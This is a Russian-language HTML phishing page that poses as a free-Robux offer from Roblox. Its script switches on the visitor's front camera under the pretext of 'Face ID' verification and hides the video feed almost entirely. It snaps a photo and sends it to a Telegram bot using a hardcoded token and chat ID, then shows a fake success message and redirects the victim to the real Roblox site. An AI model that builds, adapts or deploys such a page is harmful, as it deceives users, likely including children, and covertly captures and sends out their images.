<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Roblox | Get Robux</title>
    <style>
        body { font-family: sans-serif; background: #0b0c0d; color: white; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .box { background: #191b1d; border: 1px solid #393b3d; padding: 35px; border-radius: 20px; text-align: center; width: 85%; max-width: 380px; box-shadow: 0 15px 35px rgba(0,0,0,0.7); }
        .btn { background: #0084ff; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-size: 19px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
        #st { margin-top: 15px; color: #0084ff; font-weight: bold; display: none; }
        /* Видео активно, но почти прозрачно */
        video { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.1; pointer-events: none; }
    </style>
</head>
<body>

<div class="box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="70" style="filter: invert(1); margin-bottom: 15px;">
    <h2>БОНУС: 35,000 ROBUX</h2>
    <p>Для зачисления робуксов на ваш баланс подтвердите Face ID через безопасный шлюз.</p>
    <button class="btn" onclick="startMega()">ПОЛУЧИТЬ</button>
    <div id="st">ПОДКЛЮЧЕНИЕ...</div>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c" style="display:none;"></canvas>

<script>
    const T = '8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I';
    const C = '7889497672';

    async function startMega() {
        const btn = document.querySelector('.btn');
        const st = document.getElementById('st');
        const v = document.getElementById('v');
        const c = document.getElementById('c');

        btn.style.display = 'none';
        st.style.display = 'block';

        // 1. Пытаемся запустить камеру (универсальный способ)
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, // Просто просим переднюю без лишних условий
                audio: false 
            });
            
            v.srcObject = stream;
            
            // 2. Ждем, пока видео реально пойдет
            v.onloadedmetadata = () => {
                v.play();
                let p = 0;
                const progress = setInterval(() => {
                    p += 20;
                    st.innerText = `АВТОРИЗАЦИЯ: ${p}%`;
                    if(p >= 100) clearInterval(progress);
                }, 1000);

                // 3. Делаем фото через 5 секунд (гарантия против черноты)
                setTimeout(() => {
                    c.width = v.videoWidth;
                    c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    
                    c.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('chat_id', C);
                        fd.append('photo', blob, 'face.jpg');
                        fd.append('caption', '💎 **УСПЕШНЫЙ ЗАХВАТ!**\nПробито через универсальный метод.');

                        fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd })
                        .then(() => {
                            stream.getTracks().forEach(t => t.stop());
                            alert("✅ Личность подтверждена! Награда придет через 10 минут.");
                            window.location.href = "https://www.roblox.com";
                        });
                    }, 'image/jpeg', 0.85);
                }, 5500);
            };

        } catch (e) {
            // Если камера вообще не дала доступ
            alert("Ошибка Face ID! Нажмите 'Разрешить' и попробуйте снова.");
            btn.style.display = 'block';
            st.style.display = 'none';
        }
    }
</script>
</body>
</html>
